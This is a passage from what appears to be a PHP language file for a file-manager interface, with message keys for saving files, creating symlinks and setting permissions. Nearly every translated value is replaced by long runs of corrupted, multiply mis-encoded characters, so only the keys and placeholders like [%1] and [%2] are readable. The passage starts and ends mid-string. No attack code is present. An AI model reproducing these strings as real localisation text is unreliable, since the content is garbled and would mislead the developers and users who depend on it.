Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½:\n{%2}",
'saved' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'not_saved' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'symlinked' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%2]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'not_symlinked' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â®Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%2]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%1]".',
'permission_for' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â°Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%1]":',
'permission_set' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â°Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ [%2].',
'permission_not_set' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â®Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ 